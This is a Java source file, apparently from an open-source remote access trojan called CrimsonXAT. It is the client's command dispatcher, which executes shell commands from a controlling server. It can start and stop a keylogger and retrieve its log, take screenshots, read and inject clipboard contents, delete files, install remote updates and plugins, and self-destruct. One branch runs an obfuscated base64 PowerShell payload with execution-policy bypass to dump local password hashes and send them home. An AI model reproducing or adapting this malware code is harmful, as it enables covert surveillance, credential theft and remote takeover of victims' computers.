/*******************************************************************************
 *              Crimson Extended Administration Tool (CrimsonXAT)              *
 *                   Copyright (C) 2015 Subterranean Security                  *
 *                                                                             *
 *     This program is free software: you can redistribute it and/or modify    *
 *     it under the terms of the GNU General Public License as published by    *
 *      the Free Software Foundation, either version 3 of the License, or      *
 *                      (at your option) any later version.                    *
 *                                                                             *
 *       This program is distributed in the hope that it will be useful,       *
 *        but WITHOUT ANY WARRANTY; without even the implied warranty of       *
 *        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        *
 *                 GNU General Public License for more details.                *
 *                                                                             *
 *      You should have received a copy of the GNU General Public License      *
 *      along with this program.  If not, see http://www.gnu.org/licenses      *
 *******************************************************************************/
package subterranean.crimson.permajar.stage2;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;

import subterranean.crimson.permajar.stage1.Stage1;
import subterranean.crimson.permajar.stage1.network.Communications;
import subterranean.crimson.permajar.stage2.modules.ClipboardManipulator;
import subterranean.crimson.permajar.stage2.modules.GetInfo;
import subterranean.crimson.permajar.stage2.modules.Power;
import subterranean.crimson.permajar.stage2.modules.RemoteUpdate;
import subterranean.crimson.permajar.stage2.modules.RestartClient;
import subterranean.crimson.permajar.stage2.modules.ScreenShot;
import subterranean.crimson.permajar.stage2.modules.SelfDestruct;
import subterranean.crimson.permajar.stage2.modules.Shell;
import subterranean.crimson.permajar.stage2.modules.keylogger.Keylogger;
import subterranean.crimson.server.PluginOperations;
import subterranean.crimson.universal.BMN;
import subterranean.crimson.universal.Cryptography;
import subterranean.crimson.universal.GetFileInfo;
import subterranean.crimson.universal.Logger;
import subterranean.crimson.universal.ObjectTransfer;
import subterranean.crimson.universal.Platform;
import subterranean.crimson.universal.SigarCollection;
import subterranean.crimson.universal.Utilities;
import subterranean.crimson.universal.Version;
import subterranean.crimson.universal.containers.Message;
import subterranean.crimson.universal.enumerations.EncType;
import subterranean.crimson.universal.exceptions.InvalidObjectException;
import subterranean.crimson.universal.streams.StreamStore;
import subterranean.crimson.universal.translation.T;

public enum Executor {
	;

	public static void execute(final Message m) {

		// decode the aux if needed
		if (Stage1.options.encryptionType != EncType.None) {
			for (int i = 0; i < m.auxObject.length; i++) {
				try {
					m.auxObject[i] = ObjectTransfer.fromString(Cryptography.decrypt((byte[]) m.auxObject[i], Stage1.options.encryptionType, Stage1.options.key), false);
				} catch (InvalidObjectException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

			}
		}
		new Thread(new Runnable() {
			public void run() {
				exe(m);
			}
		}).start();
	}

	private static void exe(Message m) {

		switch (m.getName()) {
		case BMN.CLIENT_getBasicInfo: {
			Logger.add("Sending Info");

			Message r = new Message(m.getStreamID(), m.getName(), GetInfo.run());
			Communications.sendHome(r);
			break;

		}
		case BMN.SHELL_execute: {
			Logger.add("Executing command");
			String[] output = null;

			for (Shell s : Stage2.shells) {
				if (s.shellId == (Integer) m.auxObject[1]) {
					output = s.run((String) m.auxObject[0]);
				}

			}

			Message r = new Message(m.getStreamID(), m.getName(), output);

			Communications.sendHome(r);
			break;
		}
		case BMN.SHELL_initialize: {
			Logger.add("Initializing shell");
			Shell shell = new Shell();
			shell.initialize();

			Stage2.shells.add(shell);

			Message r = new Message(m.getStreamID(), m.getName(), shell.shellId);
			Communications.sendHome(r);

			break;
		}
		case BMN.SHELL_kill: {
			Logger.add("Killing shell");
			Shell shell = null;
			for (Shell s : Stage2.shells) {
				if (s.shellId == (Integer) m.auxObject[0]) {
					shell = s;
					break;
				}

			}
			Stage2.shells.remove(shell);
			shell.close();

			break;
		}
		case BMN.CLIENT_uninstall: {
			Logger.add(T.t("Self destructing"));
			SelfDestruct.run();
			break;
		}
		case BMN.POWER_restart: {
			Logger.add(T.t("Restarting host"));
			boolean test = Power.test_restart();
			Communications.sendHome(new Message(m.getStreamID(), m.getName(), test));
			if (test) {
				Power.restart();
			}

			break;
		}
		case BMN.CLIENT_restart: {

			Logger.add("Restarting client");
			RestartClient.run();
			break;
		}
		case BMN.POWER_shutdown: {
			Logger.add(T.t("Shutting down host"));
			boolean test = Power.test_shutdown();
			Communications.sendHome(new Message(m.getStreamID(), m.getName(), test));
			if (test) {
				Power.shutdown();
			}

			break;
		}
		case BMN.CLIENT_shutdown: {
			Logger.add(T.t("Shutting down client"));
			System.exit(0);

			break;
		}
		case BMN.POWER_hibernate: {
			Logger.add(T.t("Hibernating host"));
			boolean test = Power.test_hibernate();
			Communications.sendHome(new Message(m.getStreamID(), m.getName(), test));
			if (test) {
				Power.hibernate();
			}
			break;
		}
		case BMN.USER_logoff: {
			Logger.add("Logging host off");
			boolean test = Power.test_logoff();
			Communications.sendHome(new Message(m.getStreamID(), m.getName(), test));
			if (test) {
				Power.logoff();
			}
			break;
		}
		case BMN.POWER_standby: {
			Logger.add("Standing by");
			boolean test = Power.test_standby();
			Communications.sendHome(new Message(m.getStreamID(), m.getName(), test));
			if (test) {
				Power.standby();
			}
			break;
		}
		case BMN.CLIENT_relocate: {
			// TODO Add implementation

			break;
		}
		case BMN.DISCONNECTION: {
			Logger.add(T.t("Server is disconnecting"));
			if (Version.release) {
				// wait a few seconds for server to completely shut down
				try {
					Thread.sleep(15000);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				RestartClient.run();
			} else {
				System.exit(0);

			}

			break;
		}

		case BMN.FILEMANAGER_up: {
			Stage2.f.up();
			break;
		}
		case BMN.FILEMANAGER_down: {

			Stage2.f.down((String) m.auxObject[0]);

			break;
		}
		case BMN.FILEMANAGER_list: {

			Communications.sendHome(new Message(m.getStreamID(), m.getName(), Stage2.f.list()));

			break;
		}
		case BMN.FILEMANAGER_pwd: {

			Communications.sendHome(new Message(m.getStreamID(), m.getName(), Stage2.f.pwd()));

			break;

		}
		case BMN.FILEMANAGER_delete: {

			Utilities.delete(new File((String) m.auxObject[0]));

			break;
		}

		case BMN.KEYLOGGER_getLog: {
			Message r = new Message(m.getStreamID(), m.getName(), Stage2.getSettings().keyloggerLog);

			Communications.sendHome(r);

			break;
		}
		case BMN.CLIENT_assignID: {
			Stage2.getSettings().clientID = (Integer) m.auxObject[0];

			break;
		}
		case BMN.KEYLOGGER_stop: {
			Logger.add(T.t("Stopping keylogger"));

			Keylogger.stop();

			break;
		}
		case BMN.KEYLOGGER_start: {
			Logger.add(T.t("Starting keylogger"));

			Keylogger.start();

			break;
		}
		case BMN.PASSWORD_getLocalHashes: {
			Logger.add("Getting local hashes");
			// TODO Check THIS method
			String hash[] = new Shell().run("powershell -ep bypass -c \"iex $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('y0ytUNDwSy3X9U/KSk0uUfBLLdELT01yzslMzSvR1HPJL8/LyU9MCS4pysxL11DPKCkpsNLXT8os0cup1DdMKgt1DS5R1+TlAgA=')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\"");

			ArrayList<String> refined = new ArrayList<String>();
			for (String h : hash) {
				if (h.matches("*.:*.:*.:*.:")) {
					// looks like a hash
					refined.add(h);
				}

			}
			String onlyHashes[] = new String[refined.size()];
			for (int i = 0; i < onlyHashes.length; i++) {
				onlyHashes[i] = refined.remove(0);
			}
			Message mres = new Message(m.getStreamID(), m.getName(), onlyHashes);
			Communications.sendHome(mres);

			break;
		}
		case BMN.PROCESSMANAGER_list: {
			Logger.add("Getting process listing");
			Shell tempshell = new Shell();

			String[] output = null;

			Message mres = new Message(m.getStreamID(), m.getName(), output);
			Communications.sendHome(mres);
			break;
		}
		case BMN.CLIENT_getClientLog: {
			Logger.add(T.t("Getting client log"));
			ArrayList<String> log = Logger.retrieve();
			if (log == null) {
				Logger.add("Got null client log");

			}
			Message mres = new Message(m.getStreamID(), m.getName(), log);
			Communications.sendHome(mres);

			break;
		}
		case BMN.CLIENT_update: {
			RemoteUpdate.run((byte[]) m.auxObject[0]);

			break;
		}
		case BMN.SCREENMANAGER_screenshot: {

			Message mres = new Message(m.getStreamID(), m.getName(), ScreenShot.run());
			Communications.sendHome(mres);

			break;
		}
		case BMN.CLIPBOARD_inject: {
			ClipboardManipulator clip = new ClipboardManipulator();
			clip.setClipboardContents((String) m.auxObject[0]);

			break;
		}
		case BMN.CLIPBOARD_retrieve: {
			ClipboardManipulator clip = new ClipboardManipulator();
			String c = clip.getClipboardContents();
			Logger.add("Got from clipboard: " + c);
			Message mres = new Message(m.getStreamID(), m.getName(), c);
			Communications.sendHome(mres);

			break;
		}
		/*
		 * case HIVE_convertToVirtual: { Logger.add("Connecting to proxy host"); // this
		 * connection is going virtual, connect to the new gateway
		 * 
		 * Logger.add("Completed virtual conversion"); break; } case
		 * HIVE_newVirtualClient: {
		 * Logger.add("Opening temporary listener for virtual connection"); // open a
		 * server to accept the connection ProxyConnection pcon = null; try { ServerSocket
		 * Ssock = new ServerSocket(2020);
		 * Logger.add("Accepting connections on port: 2020"); Socket sock =
		 * Ssock.accept(); Ssock.close(); Logger.add("Server Socket closed");
		 * Logger.add("Adding proxyconnection"); pcon = new ProxyConnection(sock);
		 * pcon.clientID = (Integer) m.auxObject[0]; pcon.start();
		 * 
		 * Stage2.pConnections.add(pcon); } catch (IOException e) { // TODO Auto-generated
		 * catch block e.printStackTrace(); } RoutingTable.routes.put(pcon.clientID,
		 * pcon.clientID);
		 * 
		 * Logger.add("Added new virtual client"); break; }
		 */
		case BMN.FILEMANAGER_getFileInfo: {
			HashMap<String, Object> info = GetFileInfo.run((String) m.auxObject[0]);
			Message mres = new Message(m.getStreamID(), m.getName(), info);
			Communications.sendHome(mres);

			break;
		}
		case BMN.SIGAR_gather: {
			Logger.add("Running SIGAR collection");
			Message mres = new Message(m.getStreamID(), m.getName(), SigarCollection.run());
			Communications.sendHome(mres);

			break;
		}
		case BMN.CHAT_message: {
			// display it
			Stage2.chat.addMessage((String) m.auxObject[0], (String) m.auxObject[1]);
			break;
		}
		case BMN.PLUGIN_install: {
			byte[] p = (byte[]) m.auxObject[0];
			String pac = (String) m.auxObject[1];
			PluginOperations.installRemote(p, pac);

			break;
		}
		case BMN.STREAMCONTROL_start: {

			break;
		}
		case BMN.STREAMCONTROL_stop: {
			StreamStore.removeStream((int) m.auxObject[0]);
			break;
		}
		case BMN.STREAM_data: {
			StreamStore.getStream((int) m.auxObject[0]).received(m);

			break;
		}
		default: {
			MessageBuffer.addMessage(m);
		}

		}

	}

}
